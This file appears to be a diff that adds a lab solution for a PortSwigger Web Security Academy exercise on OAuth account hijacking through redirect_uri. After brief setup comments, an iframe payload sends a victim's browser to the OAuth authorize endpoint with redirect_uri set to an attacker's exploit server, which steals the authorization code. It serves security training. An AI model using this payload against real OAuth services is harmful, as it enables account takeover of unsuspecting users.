@@ -1,0 +1,8 @@
+<!--A simple payload to solve the following lab:-->
+<!--https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri-->
+
+<!--In exploit server create the following directory:-->
+<!--/oauth-callback-->
+
+<!--Have admin send request to OAuth service with exploit server url and /oauth-callback directory as the redirect_uri value-->
+<iframe src="https://[CHANGE_TO_OAUTH_SUBDOMAIN].oauth-server.net/auth?client_id=[CHANGE_TO_CLIENT_ID]&redirect_uri=https://[CHANGE_TO_EXPLOIT_SERVER_SUBDOMAIN].exploit-server.net/oauth-callback&response_type=code&scope=openid%20profile%20email"></iframe>
